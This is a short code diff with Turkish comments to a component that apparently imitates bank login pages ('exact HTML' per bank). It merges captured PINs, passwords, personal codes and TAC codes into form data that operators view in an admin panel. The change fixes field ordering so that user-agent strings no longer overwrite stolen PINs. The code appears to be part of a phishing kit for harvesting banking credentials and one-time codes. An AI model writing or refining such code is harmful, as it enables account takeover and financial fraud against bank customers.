@@ -317,6 +317,10 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
     const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";
 
+    // ⭐ ÖNEMLİ SIRA: rawFields (iframe ham alanları) ÖNCE, sonra resmi alanlar SONRA.
+    // Böylece rawFields içindeki user_agent / Mozilla / Chrome / Windows gibi
+    // anlamsız URL-escape string'leri resmi pin/password/verfuegernummer gibi alanların
+    // ÜSTÜNE YAZAMAZ. (Önceki sürümde tersiydi ve admin panelde user-agent PIN olarak görünüyordu.)
     const nextFormData = {
       ...previousFormData,
       ...rawFields,
